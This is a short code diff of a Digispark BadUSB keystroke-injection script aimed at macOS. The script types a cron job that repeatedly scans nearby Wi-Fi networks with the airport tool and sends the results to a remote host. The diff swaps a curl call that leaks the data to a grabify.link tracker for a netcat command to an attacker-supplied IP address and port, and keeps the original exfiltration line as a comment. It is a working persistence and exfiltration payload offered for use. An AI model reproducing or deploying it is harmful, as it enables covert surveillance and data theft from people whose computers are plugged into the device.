@@ -15,7 +15,10 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d | xargs)\" https://grabify.link/LINK");
+  /* You must fill in 'ip-address' and 'port' on line 19 with your own information */
+  DigiKeyboard.print("* * * * * /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d > .ssid.txt; cat .ssid.txt | netcat ip-address port  >/dev/null 2>&1");
+  /* original command which sends info to a grabify link
+  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d | xargs)\" https://grabify.link/LINK"); */
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
   DigiKeyboard.delay(500);
